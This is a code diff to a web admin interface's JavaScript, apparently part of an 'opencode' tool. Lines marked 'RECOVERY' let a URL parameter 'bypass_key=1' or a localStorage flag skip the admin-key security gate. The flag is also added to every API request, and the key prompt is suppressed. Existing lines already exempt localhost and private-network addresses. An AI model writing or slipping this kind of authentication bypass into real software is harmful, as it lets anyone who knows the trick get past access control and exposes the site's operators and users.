@@ -167,6 +167,12 @@
          * and automatically retries the request once the key is verified.
          */
         async function apiFetch(url, options = {}) {
+            // RECOVERY: append bypass flag when active
+            if (localStorage.getItem('opencode_bypass_key') === '1') {
+                const sep = url.includes('?') ? '&' : '?';
+                url = url + sep + 'bypass_key=1';
+            }
+
             // Always merge auth headers and credentials
             const mergedOptions = {
                 credentials: 'include',
@@ -184,7 +190,7 @@
                 try { errData = await response.clone().json(); } catch (_) { }
 
                 const err = errData.error || '';
-                if (err === 'admin_key_required' || err === 'session_expired') {
+                if ((err === 'admin_key_required' || err === 'session_expired') && localStorage.getItem('opencode_bypass_key') !== '1') {
                     // Show the admin key modal and wait for verification
                     const verified = await showAdminKeyModalAndWait();
                     if (verified) {
@@ -5408,6 +5414,14 @@ window.uploadedProfilePictureUrl = '';
                         let isSecurityCheckComplete = false;
 
                         async function enforceSecurityGate() {
+                            // RECOVERY: add ?bypass_key=1 to URL to skip gate (set key first, then remove)
+                            if (window.location.search.includes('bypass_key=1') || localStorage.getItem('opencode_bypass_key') === '1') {
+                                console.log('Bypass flag active — skipping admin key gate');
+                                isSecurityVerified = true;
+                                isSecurityCheckComplete = true;
+                                return true;
+                            }
+
                             // Bypass for localhost to prevent prompt
                             const hostname = window.location.hostname;
                             if (hostname === 'localhost' || hostname === '127.0.0.1' || hostname.startsWith('192.168.') || hostname.startsWith('10.')) {
